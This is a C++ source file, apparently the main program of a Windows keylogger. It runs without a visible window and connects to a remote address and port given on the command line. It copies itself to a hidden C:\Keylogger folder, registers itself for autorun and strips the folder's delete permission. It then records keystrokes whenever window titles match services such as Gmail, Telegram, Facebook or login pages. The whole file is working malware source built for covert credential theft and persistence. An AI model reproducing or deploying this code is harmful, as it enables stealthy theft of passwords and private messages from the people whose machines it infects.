#include "Keylogger.h"
#include "Resilience.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

std::vector<std::wstring> filters = { L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail",
									  L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Авторизация", L"Вход", L"Login", L"log in", L"sign up" };

HANDLE m_singleInstanceMutex;
Keylogger* keylogger;

bool IsProcessRunning() {
	m_singleInstanceMutex = CreateMutex(NULL, TRUE, L"KeyloggerInstanceMutex");
	if (m_singleInstanceMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
		return true;
	}
	return false;
}

BOOL WINAPI ShutdownHandler(DWORD dwCtrlType)
{
	if (dwCtrlType == CTRL_SHUTDOWN_EVENT || dwCtrlType == CTRL_LOGOFF_EVENT)
	{
		keylogger->~Keylogger();
		ReleaseMutex(m_singleInstanceMutex);
		ExitProcess(0);
		return TRUE;
	}
	return FALSE;
}

int wmain(int argc, wchar_t* argv[]) {
	bool flag = IsProcessRunning();
	if (argc < 4)
		MessageBox(NULL, L"Pass address, port and flushThreshold as params to this executable", NULL, 0);
	if (argc < 4 || flag)
		return 0;	

	SetConsoleCtrlHandler(ShutdownHandler, TRUE);

	std::locale::global(std::locale("ru_RU.UTF-8"));
	std::wistringstream ss(argv[3]);
	int flushThreshold;
	ss >> flushThreshold;

	auto client = new TcpClient(argv[1], argv[2], flushThreshold);
	
	while(!client->Connect(L"",L"")) {
		Sleep(1000);
	}

	flag = false;
	if (std::wstring(argv[0]) != L"C:\\Keylogger\\keylogger.exe")
		flag = Resilience::Replicate(argv[0], L"C:\\Keylogger\\keylogger.exe");
	else flag = true;
	if (flag) {
		std::vector<std::wstring> args = { argv[1],argv[2],argv[3] };
		Resilience::AddToAutorun(L"C:\\Keylogger\\keylogger.exe", L"keylogger.exe", args);
		Resilience::HideFolder(L"C:\\Keylogger");
		Resilience::RemoveDeletePermission(L"C:\\Keylogger");
	}

	keylogger = new Keylogger(client, new Filter(filters));
	
	while (true) {
		keylogger->logKeys();
		Sleep(50);
	}

	return 0;
}